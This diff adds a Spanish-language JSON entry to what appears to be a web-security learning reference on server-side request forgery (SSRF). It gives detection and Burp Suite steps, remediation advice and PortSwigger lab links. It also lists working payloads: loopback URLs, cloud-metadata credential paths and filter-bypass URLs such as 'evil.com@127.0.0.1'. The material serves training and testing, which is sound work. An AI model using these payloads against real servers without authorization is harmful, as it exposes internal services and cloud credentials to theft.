@@ -1,0 +1,61 @@
+{
+  "id": "ssrf",
+  "name": "Server-Side Request Forgery (SSRF)",
+  "category": "Server-side",
+  "severity": "High",
+  "aka": ["SSRF"],
+  "summary": "La aplicación realiza peticiones HTTP a una URL controlada por el atacante, permitiendo alcanzar servicios internos, metadatos de cloud o la propia loopback que normalmente no son accesibles.",
+  "where_to_look": [
+    "Parámetros que contienen URLs: webhooks, importadores, previsualizaciones, comprobadores de stock.",
+    "Cabeceras como Referer procesadas por el backend.",
+    "Funcionalidad que carga recursos remotos (imágenes por URL, PDF, XML con DTD)."
+  ],
+  "detection": [
+    "Cambia la URL legítima por http://127.0.0.1/ o http://localhost/ y observa la respuesta.",
+    "Apunta a un endpoint interno conocido (admin) o a 169.254.169.254 (metadatos cloud).",
+    "Si no hay respuesta visible (ciega), usa Burp Collaborator y comprueba interacciones DNS/HTTP."
+  ],
+  "burp_steps": [
+    "Captura la petición con el parámetro URL y mándala al Repeater.",
+    "Sustituye el host por 127.0.0.1, localhost o una IP interna y revisa el cambio en la respuesta.",
+    "Para metadatos AWS: http://169.254.169.254/latest/meta-data/ y luego iam/security-credentials/.",
+    "Si hay filtros, prueba bypasses: notación decimal, IPv6, redirecciones, @, o un dominio que resuelva a 127.0.0.1.",
+    "SSRF ciega: pon tu subdominio de Collaborator y confirma la petición saliente."
+  ],
+  "payloads": {
+    "Loopback / interno": [
+      "http://127.0.0.1/admin",
+      "http://localhost/",
+      "http://127.1/",
+      "http://[::1]/"
+    ],
+    "Metadatos cloud": [
+      "http://169.254.169.254/latest/meta-data/",
+      "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "http://metadata.google.internal/computeMetadata/v1/"
+    ],
+    "Bypass de filtros": [
+      "http://2130706433/  (127.0.0.1 en decimal)",
+      "http://0x7f000001/",
+      "http://127.0.0.1.nip.io/",
+      "http://evil.com@127.0.0.1/",
+      "http://localhost#@target/"
+    ]
+  },
+  "commands": [],
+  "remediation": [
+    "Valida las URLs contra una allowlist de hosts/esquemas permitidos.",
+    "Bloquea rangos privados, loopback y la IP de metadatos a nivel de red.",
+    "Deshabilita redirecciones y exige autenticación en servicios internos."
+  ],
+  "portswigger_labs": [
+    {"title": "SSRF básica contra el servidor local", "difficulty": "APPRENTICE", "url": "https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost"},
+    {"title": "SSRF contra otro sistema del backend", "difficulty": "APPRENTICE", "url": "https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system"},
+    {"title": "SSRF con bypass de filtro por blacklist", "difficulty": "PRACTITIONER", "url": "https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter"},
+    {"title": "SSRF ciega con Collaborator", "difficulty": "PRACTITIONER", "url": "https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection"}
+  ],
+  "references": [
+    {"title": "PortSwigger — SSRF", "url": "https://portswigger.net/web-security/ssrf"},
+    {"title": "OWASP — SSRF", "url": "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"}
+  ]
+}
